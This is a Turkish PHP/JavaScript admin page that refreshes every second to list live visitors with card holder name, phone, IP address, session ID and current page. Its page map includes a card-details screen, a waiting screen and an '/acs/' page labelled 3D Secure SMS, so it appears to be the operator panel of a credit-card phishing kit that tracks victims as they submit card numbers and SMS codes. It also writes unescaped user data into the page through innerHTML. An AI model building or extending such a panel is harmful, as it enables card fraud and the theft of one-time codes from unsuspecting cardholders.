<?php
// Veritabanı bağlantısı
require_once '../config.php';
$pdo = getDbConnection();
?>

<div class="card">
    <div class="card-header">
        <h2 class="card-title">
            <i class="fas fa-circle" style="color: #2ecc71; font-size: 0.8rem;"></i>
            Canlı Kullanıcı Takibi
        </h2>
        <div style="display: flex; align-items: center; gap: 10px;">
            <span style="color: #718096; font-size: 0.9rem;">Otomatik yenileme: 1 saniye</span>
            <button class="btn btn-primary btn-sm" onclick="refreshOnlineUsers()">
                <i class="fas fa-sync-alt"></i> Yenile
            </button>
        </div>
    </div>
    <div class="card-body">
        <div id="onlineUsersTable">
            <div style="text-align: center; padding: 2rem; color: #718096;">
                <i class="fas fa-spinner fa-spin" style="font-size: 2rem;"></i>
                <p style="margin-top: 1rem;">Yükleniyor...</p>
            </div>
        </div>
    </div>
</div>

<style>
.table-responsive {
    overflow-x: auto;
}

.live-indicator {
    display: inline-block;
    width: 8px;
    height: 8px;
    background: #2ecc71;
    border-radius: 50%;
    animation: pulse 2s infinite;
    margin-right: 8px;
}

@keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.5; transform: scale(1.2); }
}

.time-badge {
    display: inline-block;
    padding: 4px 8px;
    border-radius: 12px;
    font-size: 0.75rem;
    font-weight: 600;
}

.time-active {
    background: rgba(46, 204, 113, 0.1);
    color: #2ecc71;
}

.time-recent {
    background: rgba(243, 156, 18, 0.1);
    color: #f39c12;
}

.empty-state {
    text-align: center;
    padding: 3rem;
    color: #718096;
}

.empty-state i {
    font-size: 4rem;
    margin-bottom: 1rem;
    opacity: 0.3;
}
</style>

<script>
async function refreshOnlineUsers() {
    try {
        const response = await fetch('/api.php?action=get_online_users');
        const data = await response.json();
        
        const container = document.getElementById('onlineUsersTable');
        
        if (data.success && data.users.length > 0) {
            let html = `
                <div class="table-responsive">
                    <table>
                        <thead>
                            <tr>
                                <th>Durum</th>
                                <th>User ID</th>
                                <th>Ad Soyad</th>
                                <th>Telefon</th>
                                <th>IP Adresi</th>
                                <th>Sayfa</th>
                                <th>Session ID</th>
                                <th>Son Aktivite</th>
                            </tr>
                        </thead>
                        <tbody>
            `;
            
            data.users.forEach(user => {
                const pageIcon = getPageIcon(user.current_page);
                const pageName = getPageName(user.current_page);
                const timeAgo = formatTimeAgo(parseFloat(user.seconds_ago));
                const timeClass = parseFloat(user.seconds_ago) < 3 ? 'time-active' : 'time-recent';
                
                const userId = user.user_id ? `#${user.user_id}` : '-';
                const userName = user.card_holder || user.identifier_value || '-';
                const userPhone = user.phone || '-';
                
                html += `
                    <tr>
                        <td><span class="live-indicator"></span></td>
                        <td><strong>${userId}</strong></td>
                        <td>${userName}</td>
                        <td>${userPhone}</td>
                        <td><code style="font-size: 0.85rem;">${user.ip_address}</code></td>
                        <td>
                            <i class="${pageIcon}" style="margin-right: 4px;"></i>
                            ${pageName}
                        </td>
                        <td><code style="font-size: 0.75rem;">${user.session_id.substring(0, 12)}...</code></td>
                        <td><span class="time-badge ${timeClass}">${timeAgo}</span></td>
                    </tr>
                `;
            });
            
            html += '</tbody></table></div>';
            container.innerHTML = html;
        } else {
            container.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-users-slash"></i>
                    <p>Şu anda aktif kullanıcı yok</p>
                </div>
            `;
        }
    } catch(error) {
        console.error('Error:', error);
        document.getElementById('onlineUsersTable').innerHTML = `
            <div class="empty-state">
                <i class="fas fa-exclamation-triangle"></i>
                <p>Veri yüklenirken hata oluştu</p>
                <p style="font-size: 0.8rem; margin-top: 0.5rem;">${error.message}</p>
            </div>
        `;
    }
}

function formatTimeAgo(seconds) {
    if (seconds < 0.1) return '0.0s';
    if (seconds < 1) return seconds.toFixed(1) + 's';
    if (seconds < 60) return Math.floor(seconds) + 's';
    if (seconds < 3600) return Math.floor(seconds / 60) + 'm';
    return Math.floor(seconds / 3600) + 'h';
}

function getPageIcon(page) {
    const icons = {
        '/index.php': 'fas fa-home',
        '/screen2.php': 'fas fa-file-alt',
        '/screen3.php': 'fas fa-credit-card',
        '/bekle.php': 'fas fa-hourglass-half',
        '/success.php': 'fas fa-check-circle',
        '/3dredirect.php': 'fas fa-shield-alt'
    };
    
    for (let path in icons) {
        if (page.includes(path)) return icons[path];
    }
    
    if (page.includes('/acs/')) return 'fas fa-lock';
    if (page.includes('/admin/')) return 'fas fa-user-shield';
    return 'fas fa-file';
}

function getPageName(page) {
    const names = {
        '/index.php': 'Ana Sayfa',
        '/screen2.php': 'Tutar Seçimi',
        '/screen3.php': 'Kart Bilgileri',
        '/bekle.php': 'Bekleme Ekranı',
        '/success.php': 'Başarılı',
        '/3dredirect.php': '3D Yönlendirme',
        '/test_tracking.php': 'Test Sayfası'
    };
    
    for (let path in names) {
        if (page.includes(path)) return names[path];
    }
    
    if (page.includes('/acs/')) return '3D Secure SMS';
    if (page.includes('/admin/')) return 'Admin Panel';
    return page;
}

// İlk yükleme
refreshOnlineUsers();

// Her 1 saniyede bir yenile
setInterval(refreshOnlineUsers, 1000);
</script>
